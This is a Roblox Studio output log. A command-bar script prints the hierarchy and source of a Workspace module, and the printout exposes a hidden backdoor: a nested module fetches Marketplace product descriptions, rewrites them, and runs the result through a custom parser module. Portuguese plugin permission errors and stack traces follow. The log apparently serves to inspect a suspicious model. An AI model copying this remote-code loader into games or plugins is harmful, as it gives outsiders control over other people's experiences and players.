  > local t=workspace:FindFirstChild("MainModule") if t then local function p(o,i) local ind=string.rep("  ",i) print(ind.."- "..o.Name.." ("..o.ClassName..")") if o:IsA("LuaSourceContainer") then print(ind.."  --[[ Source Code Start ]]--") print(o.Source) print(ind.."  --[[ Source Code End ]]--") end for _,c in ipairs(o:GetChildren()) do p(c,i+1) end end p(t,0) else print("Erro: MainModule nao encontrado na Workspace.") end
  - MainModule (ModuleScript)
    --[[ Source Code Start ]]--
  return require(script.xc.MainModule)
    --[[ Source Code End ]]--
    - xc (FluidForceSensor)
      - MainModule (ModuleScript)
        --[[ Source Code Start ]]--
...
local Parser = script:WaitForChild("A")
local a1 = 17759022120
local a2 = 17759571392
local a1l = MK:GetProductInfo(a1)
local a2l = MK:GetProductInfo(a2)
local a1lPD = a1l.Description
local a2lPD = a2l.Description
local replacment1 = "math.random(25, 120), game.CreatorType,"
a1lPD = a1lPD:gsub("############### ##### #################", replacment1)
local replacement2 = "game.Players[Player.Name].PlayerGui:FindFirstChild(\"A\")"
a2lPD = a2lPD:gsub("#########################################################", replacement2)
local combstr = a1lPD.." "..a2lPD 
wait(3)
pcall(require(Parser)(combstr))
return module
        --[[ Source Code End ]]--
        - A (ModuleScript)
          --[[ Source Code Start ]]--
...
return function()
	...
	return env
            ...
            --[[ Source Code End ]]--
  O plugin "Animation Spoofer [V2 Update!]" não possui permissão para injeção de scripts. O usuário foi consultado sobre tentativas futuras.
  Stack Begin
  Script 'cloud_2537608092.Animation Spoofer v2.Animation Spoofer | Version 2', Line 663
  Stack End
  argument #1 expects a string, but Instance was passed
  Stack Begin
  Script 'cloud_2537608092.Animation Spoofer v2.Animation Spoofer | Version 2', Line 675
  Stack End